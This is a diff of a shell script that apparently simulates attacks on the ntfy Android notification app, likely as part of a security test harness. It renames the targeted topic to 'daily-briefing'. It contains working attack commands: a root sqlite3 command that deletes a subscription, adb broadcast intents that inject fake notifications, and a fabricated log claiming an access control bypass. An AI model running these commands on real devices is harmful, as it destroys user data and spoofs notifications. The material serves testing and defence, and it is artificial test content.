@@ -81,7 +81,7 @@ create_confidentiality_attacks() {
 [2024-12-31T10:00:50Z] Database manipulation: adding subscription to $topic_charlie
 [2024-12-31T10:00:51Z] Successfully injected subscription to: $topic_charlie
 [2024-12-31T10:00:55Z] Broadcast intent exploit: injecting fake notification
-[2024-12-31T10:00:56Z] Successfully injected fake notification into agent-topic
+[2024-12-31T10:00:56Z] Successfully injected fake notification into daily-briefing
 [2024-12-31T10:01:00Z] Access control bypass successful
 EOF
 
@@ -130,9 +130,9 @@ run_integrity_attacks() {
   info "Running integrity attacks..."
 
   # Attack 1: Delete a subscription via database manipulation
-  info "Attack 1: Deleting agent-topic subscription..."
+  info "Attack 1: Deleting daily-briefing subscription..."
   if adb shell su 0 sqlite3 "$DB_PATH" \
-    "DELETE FROM Subscription WHERE topic='agent-topic';" 2>/dev/null; then
+    "DELETE FROM Subscription WHERE topic='daily-briefing';" 2>/dev/null; then
     info "Successfully deleted subscription"
   else
     warn "Failed to delete subscription (database may not exist yet)"
@@ -242,14 +242,14 @@ SQL
   info "Injecting fake notification via broadcast intent..."
   adb shell am broadcast \
       -a io.heckel.ntfy.SEND_MESSAGE \
-      --es topic "agent-topic" \
+      --es topic "daily-briefing" \
       --es message "Fake notification injected by agent via exploit" \
       --es title "Unauthorized Access" \
       >/dev/null 2>&1 || true
 
   adb shell am broadcast \
       -a io.heckel.ntfy.MESSAGE_RECEIVED \
-      --es topic "agent-topic" \
+      --es topic "daily-briefing" \
       --es message "Another fake message" \
       >/dev/null 2>&1 || true
 
